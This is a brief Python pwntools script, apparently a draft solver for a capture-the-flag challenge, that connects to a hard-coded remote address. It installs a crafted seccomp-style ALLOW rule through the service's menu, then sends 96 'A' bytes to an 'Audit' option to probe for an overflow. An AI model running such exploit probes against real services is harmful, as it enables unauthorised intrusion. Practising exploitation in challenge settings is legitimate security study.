import re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "144.79.188.39", 40917

def run():
    io = remote(HOST, PORT, timeout=10)
    print(io.recvuntil(b"-1) exit\n").decode())
    
    # 0) input rule
    io.sendline(b"0")
    print(io.recvuntil(b"1) use examples\n").decode())
    io.sendline(b"0")
    print(io.recvuntil(b"size?\n").decode())
    
    # Send ALLOW rule
    rule = p16(0x06) + p8(0) + p8(0) + p32(0x7fff0000)
    io.sendline(str(len(rule)).encode())
    print(io.recvuntil(b"note?\n").decode())
    io.send(rule)
    print(io.recvuntil(b"-1) exit\n").decode())
    
    # 3) Install
    io.sendline(b"3")
    res = io.recvuntil(b"-1) exit\n").decode()
    print("Install response:\n", res)
    
    # 5) Audit
    io.sendline(b"5")
    print(io.recvuntil(b"size?\n").decode())
    io.sendline(b"96") # 0x60
    print(io.recvuntil(b"note?\n").decode())
    io.send(b"A"*96)
    
    try:
        data = io.recv(timeout=3)
        print("Audit output:", data)
    except Exception as e:
        print("Audit error:", e)
        
    io.close()

if __name__ == "__main__":
    run()
